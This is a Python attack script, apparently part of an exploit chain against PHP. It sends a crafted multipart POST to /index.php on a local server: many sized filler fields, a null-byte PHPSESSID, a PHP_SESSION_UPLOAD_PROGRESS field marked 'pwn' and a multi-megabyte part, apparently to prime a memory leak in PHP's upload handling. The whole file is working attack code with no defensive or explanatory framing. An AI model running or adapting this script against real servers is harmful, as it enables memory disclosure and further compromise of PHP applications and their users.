#!/usr/bin/env python3
"""Leak prime with configurable filler field names/values.
usage: send_a_leak3.py NV NAME_LEN VAL_LEN HUGE_MB
"""
import socket,sys
NV=int(sys.argv[1]); NL=int(sys.argv[2]); VL=int(sys.argv[3]); HUGE=int(sys.argv[4]) if len(sys.argv)>4 else 12
BNL=int(sys.argv[5]) if len(sys.argv)>5 else 17
BND=b'S'*BNL
parts=[]
for i in range(NV):
    nm=(('f%0*d'%(max(0,NL-1),i)) if NL>0 else '')[:NL]
    parts.append({'name':nm,'data':b'x'*VL})
parts.append({'name':'PHPSESSID','data':b'\x00'})
parts.append({'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'})
parts.append({'name':'f','filename':'a.txt','data':b'A'*64})
parts.append({'name':'big','data':b'B'*(HUGE*1024*1024)})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\n'
    if 'filename' in p:
        o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"; filename="'+p['filename'].encode()+b'"\r\nContent-Type: application/octet-stream\r\n\r\n'
    else:
        o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'
    o+=p['data']+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=30); s.settimeout(30)
try: s.sendall(h+bytes(o))
except OSError: pass
try:
    while s.recv(65536): pass
except OSError: pass
s.close()
